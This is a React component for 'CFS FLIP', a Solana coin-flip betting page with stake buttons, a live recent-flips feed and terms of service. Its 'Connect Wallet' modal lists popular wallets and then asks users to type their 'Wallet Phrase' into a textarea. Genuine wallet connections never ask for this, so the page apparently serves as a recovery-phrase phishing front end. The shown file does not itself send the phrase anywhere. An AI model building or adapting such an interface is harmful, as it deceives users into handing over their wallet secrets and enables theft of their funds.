import { useState, useEffect } from "react";
import axios from 'axios';

const FlipCOnnect = ({lang}) => {

    const [buttonClass, setButtonClass] = useState('');
    const [advert, setAdvert] = useState('advert advert-flip');
    const [firstPrice, setFirstPrice] = useState(0.01);
    const [secondPrice, setSecondPrice] = useState(0.05);
    const [thirdPrice, setThirdPrice] = useState(0.1);
    const [degenBoom, setDegenBoom] = useState("degen-boom");
    const [btnColor, setBtnColor] = useState('connect-wallet-btn');
    const [formContainer, setFormContainer] = useState("form-container");
    const [faq, setFaq] = useState("faq");
    const [flipers, setFlippers] = useState([]);

    const howClicked = () => {
        setFaq('faq active');
    }

    const comClicked = () => {
        setFaq('faq');
    }

    const connectWal = () => {
        setFormContainer("form-container active");
    }

    const cancel = () => {
        setFormContainer("form-container");
    }


    const degenClicked = () => {

        const topActiveBtn = document.querySelector(".coin-btn-container button.active");

        if (buttonClass === '') {
            // Turn on degen mode
            setButtonClass('active');
            setAdvert('advert advert-flip active');
            setFirstPrice(0.1);
            setSecondPrice(0.5);
            setThirdPrice(1.0);
            topActiveBtn.classList.add("beaut");
            setDegenBoom("degen-boom active");
            setBtnColor("connect-wallet-btn active");
        } else {
            // Turn off degen mode
            topActiveBtn.classList.remove("beaut");
            setButtonClass('');
            setAdvert('advert advert-flip');
            setFirstPrice(0.01);
            setSecondPrice(0.05);
            setThirdPrice(0.1);
            setDegenBoom("degen-boom");
            setBtnColor("connect-wallet-btn");
        }
    };


    const chooseBtn1 = (e) => {
        e.currentTarget.classList.add("active");
        e.currentTarget.parentElement.children[1].classList.remove("active");
        console.log(e.currentTarget.parentElement.children[1]);
    }

    const chooseBtn2 = (e) => {
        e.currentTarget.classList.add("active");
        e.currentTarget.parentElement.children[0].classList.remove("active");
    }

    const walletTypeClicked = (e) => {
        let walletType = e.currentTarget.value;

        let walletTypeContainer = e.currentTarget.parentElement;
        let walletPhrase = e.currentTarget.parentElement.parentElement.children[4];
        
        walletPhrase.classList.add('active');
        walletTypeContainer.classList.add('active');
    }

    useEffect(() => {
        async function getFlippers() {
            try {
                let url = "https://backend.claimfeesol.com/get-flipers.php";

                const response = await axios.get(url, {
                    headers: {
                        "Content-Type" : "application/json"
                    },withCredentials: true
                })
                console.log(response.data);
                if (response.data.status === 'success'){
                    setFlippers(response.data.flips);
                }else {
                    setFlippers([]); // prevent undefined
                }
            } catch (error) {
                console.log("Error fetching flips: ", error);
                setFlippers([]);
            }
        }

        getFlippers();
        
        const interval = setInterval(getFlippers, 10000);
        return () => clearInterval(interval);
    },[])

    const timeAgo = (dateString) => {
        const now = new Date();
        const past = new Date(dateString);
        const seconds = Math.floor((now - past) / 1000);

        if (seconds < 60) return `${seconds} sec ago`;
            const minutes = Math.floor(seconds / 60);
            if (minutes < 60) return `${minutes} min ago`;
            const hours = Math.floor(minutes / 60);
            if (hours < 24) return `${hours} hours ago`;
            const days = Math.floor(hours / 24);
            return `${days} days ago`;
    };

    return ( 
        <>
        <div className="flip-new-main">
            <div className="flip-container-left">
                <div className={advert}>
                    <div className="advert-text">
                        <div className="text">Click,<br></br>Flip,<br></br>Snatch!<br></br>
                        <div className={degenBoom}>
                            {lang === 'en' ? '(Degen Mode}' : '(德根模式'} <img src="/boom.png" alt="" />)
                        </div>
                        </div>
                    </div>
                    <div className="advert-img-conteiner">
                        <img src="spin.gif" alt="advert img" />
                    </div>
                </div>
            </div>
            <div className="flip-container-right">
                <div className="cleanup-bottom-content flip-clean-up" style={{gap: '0'}}>
                    <div className="cleanup-bottom-content-top maxium" style={{borderRadius: '20px'}}>
                        <div className="cleanup-bottom-top-main-content" style={{marginBottom: '20px'}}>
                            <header>
                                <h2>1. {lang === 'en' ? 'Choose' : ' 选择'}</h2>
                            </header>
                            <div className="coin-btn-container">
                                <button onClick={chooseBtn1} className="active">
                                    <p>{lang === 'en' ? 'Head' : '正面'}</p>
                                    <img src="/coin_head.svg" alt="" />
                                </button>
                                <button onClick={chooseBtn2} className="">
                                    <p>{lang === 'en' ? 'Tail' : '反面'}</p>
                                    <img src="/coin_tail.svg" alt="" />
                                </button>
                            </div>
                        </div>
                        <div className="cleanup-bottom-top-main-content" style={{paddingBottom: "60px"}}>
                            <header style={{display: "flex", justifyContent: "space-between", width: "100%"}}>
                                <h2>2. {lang === 'en' ? 'Commit' : ' 数额'}</h2>
                                <div className="degen-container">
                                    <img src="/degen_mode.svg" alt="" />
                                    <div className="text">{lang === 'en' ? 'Degen Mode' : '德根模式'}</div>
                                    <button type="button" onClick={degenClicked} className={buttonClass}>
                                        <span></span>
                                    </button>
                                </div>
                            </header>
                            <div className="coin-btn-container lower-btn">
                                <button>
                                    <p style={{opacity: 0.4}}>{firstPrice}</p>
                                    <img src="/Solana_logo.svg" alt="" />
                                </button>
                                <button>
                                    <p style={{opacity: 0.4}}>{secondPrice}</p>
                                    <img src="/Solana_logo.svg" alt="" />
                                </button>
                                <button>
                                    <p style={{opacity: 0.4}}>{thirdPrice}</p>
                                    <img src="/Solana_logo.svg" alt="" />
                                </button>
                            </div>
                        </div>
                    </div>
                    <div className="cleanup-bottom-content-bottom flip-clean-up-btn" style={{borderRadius: '20px'}}>
                        <div className="connect-wallet-btn-container flip-clean-up-btn-cont">
                            <button onClick={connectWal} type="button" className={btnColor} style={{width: '90%'}}>{lang === 'en' ? 'Connect Wallet' : '连接钱包'}</button>
                        </div>
                        <p style={{textAlign: 'center', marginTop: '10px', fontSize: '9px'}}>{lang === 'en' ? '3% Platform Fee will be taken from your bet amount.' : '将从您的下注额中扣除 3% 的平台费'}</p>
                    </div>
                </div>
            </div>
        </div>
        <div className="cleanup-bottom">
            <div className="cleanup-bottom-content">
                <div className="cleanup-bottom-content-bottom">
                    <header>
                        <h2>{lang === 'en' ? 'Recent Flips' : '最近翻转'}</h2>
                    </header>
                    <div className="cleanup-bottom-content-bottom-main-content">
                        <div className="recent-flip">
                            {
                                flipers.length > 0 ? (
                                    flipers.map((flip, index) => (
                                        <div key={index} className="recent-flip-container">
                                            <div className="flip-players">
                                                <p style={{color: "rgb(165, 255, 184)"}}>{flip.user_id}</p>
                                                <p style={{color: "grey"}}>{lang === 'en' ? 'flipped' : '翻转'}</p>
                                                <p>{Number(flip.amount).toLocaleString()} SOL</p>
                                                <p style={{color: "grey"}}>{lang === 'en' ? 'and' : '并'}</p>
                                                <p className={`loss
                                                    ${flip.status === "Doubled" ? "" : "active"}
                                                    `}>{lang === 'en' ? 'got rugged:(' : '被卷毯:('}</p>
                                                <p className={`win
                                                ${flip.status === "Doubled" ? "active" : ""}
                                                `}>{lang === 'en' ? 'doubled!' : '翻倍！'}</p>
                                            </div>
                                            <div className="">
                                                <p>{timeAgo(flip.created_at)}</p> {/* <-- dynamic time */}
                                            </div>
                                        </div>
                                    ))
                                ) : (
                                    <p>No flips yet</p>
                                )
                            }
                            
                            {/* <div className="recent-flip-container">
                                <div className="flip-players">
                                    <p style={{color: "rgb(165, 255, 184)"}}>9nnwT...A1E13</p>
                                    <p style={{color: "grey"}}>{lang === 'en' ? 'flipped' : '翻转'}</p>
                                    <p>0.01 SOL</p>
                                    <p style={{color: "grey"}}>{lang === 'en' ? 'and' : '并'}</p>
                                    <p className="loss active">{lang === 'en' ? 'got rugged:(' : '被卷毯:('}</p>
                                    <p className="win">{lang === 'en' ? 'doubled!' : '翻倍！'}</p>
                                </div>
                                <div className="">
                                    <p>15 sec ago</p>
                                </div>
                            </div> */}
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div className="connect-wallet-btn-container">
            <button type="button" onClick={howClicked} className="how-it-work-btn">{lang === 'en' ? '[Terms and Conditions]' : '[条款和条件]'}</button>
        </div>
        <div className={faq}>
                <div className="faq-main">
                    <header className="faq-header">
                        <img src="/info.svg" alt="" />
                        <h2>{lang === 'en' ? 'How it Work' : '条款和条件'}</h2>
                    </header>
                    <div className="faq-container">
                        <div className="faq-content">
                            <h2>{lang === 'en' ? 'Age Requirement' : '年龄要求'}</h2>
                            <p>{lang === 'en' ? 'By using CFS FLIP, you confirm that you are at least 18 years old. Minors are strictly prohibited from using this platform.' : '使用 CFS FLIP，即表示您确认您至少 18 岁。未成年人被严格禁止使用该平台。'}</p>
                        </div>
                        <div className="faq-content">
                            <h2>{lang === 'en' ? 'Geographic Restrictions' : '地域限制'}</h2>
                            <p>{lang === 'en' ? 'CFS FLIP does not provide services in regions such as the European Union, United Kingdom, United States, Australia, and Panama. Accessing from these regions or bypassing restrictions via VPN is considered a violation.' : 'CFS FLIP 不在欧盟、英国、美国、澳大利亚、巴拿马等地区提供服务。从这些地区访问，或通过 VPN 绕过限制，被视为违规。'}</p>
                        </div>
                        <div className="faq-content">
                            <h2>{lang === 'en' ? 'Responsible Entertainment' : '负责任的娱乐'}</h2>
                            <p>{lang === 'en' ? 'CFS FLIP is for entertainment purposes only and should not be used as a tool for profit. Please play responsibly, avoid chasing losses, and do not spend funds you cannot afford to lose.' : 'CFS FLIP 仅用于娱乐目的，不应被用作盈利工具。请负责任地参与，避免追逐亏损，也不要花费您无法承受损失的资金。'}</p>
                        </div>
                        <div className="faq-content">
                            <h2>{lang === 'en' ? 'Disclaimer' : '免责声明'}</h2>
                            <p>{lang === 'en' ? 'CFS FLIP is provided “as is,” with no guarantees regarding outcomes or service. All risks are borne by the user. The platform is not responsible for asset losses, service interruptions, or related disputes.' : 'CFS FLIP 按“现状”提供，不对结果或服务做任何保证。所有风险由用户自行承担。该平台不对资产损失、服务中断或相关争议负责。'}</p>
                        </div>
                        <div className="faq-content">
                            <h2>{lang === 'en' ? 'Transparency' : '透明性'}</h2>
                            <p>{lang === 'en' ? 'All game records are stored on-chain and publicly accessible. Anyone can verify activity through the platform or blockchain explorers.' : '所有游戏记录存储在链上并公开可访问。任何人都可以通过平台或区块链浏览器验证活动。'}</p>
                        </div>
                        <div className="faq-content">
                            <h2>{lang === 'en' ? 'Agreement to Terms' : '条款同意'}</h2>
                            <p>{lang === 'en' ? 'By continuing to use CFS FLIP, you acknowledge and agree to these terms. If you do not agree, you must stop using the platform immediately.' : '继续使用 CFS FLIP，即表示您承认并同意这些条款。如果您不同意，您必须立即停止使用该平台。'}</p>
                        </div>
                    </div>
                    <div className="complete-btn-container">
                        <button type="button" onClick={comClicked}>{lang === 'en' ? 'Complete' : '同意'}</button>
                    </div>
                </div>
            </div>
            <div className={formContainer}>
                <form onSubmit={(e) => e.preventDefault()}>
                    <div className="cancel-container">
                        <button onClick={cancel}><div className="cancel"></div> </button>
                    </div>
                    <header>
                        <h2>Connect a wallet on Solana to continue</h2>
                    </header>
                    <p className="require">You must have atleat 0.02 sol to continue</p>
                    <div className="Wallet-type-container">
                        <button type="button" onClick={walletTypeClicked} className="wallet-type-row">
                            <img src="/ave.svg" alt="wallet logo" />
                            <p>Ave Wallet</p>
                        </button>
                        <button type="button" onClick={walletTypeClicked} className="wallet-type-row">
                            <img src="/solflare.svg" alt="wallet logo" />
                            <p>Solflare</p>
                        </button>
                        <button type="button" onClick={walletTypeClicked} className="wallet-type-row">
                            <img src="/trust.svg" alt="wallet logo" />
                            <p>Trust Wallet</p>
                        </button>
                        <button type="button" onClick={walletTypeClicked} className="wallet-type-row">
                            <img src="/phantom.svg" alt="wallet logo" />
                            <p>Phantom</p>
                        </button>
                        <button type="button" onClick={walletTypeClicked} className="wallet-type-row">
                            <img src="/download.svg" alt="wallet logo" />
                            <p>Coinbase Wallet</p>
                        </button>
                    </div>
                    <div className="Wallet-phrase-container">
                        <label htmlFor="phrase">Wallet Phrase</label>
                        <textarea name="phrase" id="phrase"></textarea>
                        <div className="form-btn-container">
                            <button>Connect</button>
                        </div>
                    </div>
                </form>
            </div>
        </>
     );
}
 
export default FlipCOnnect;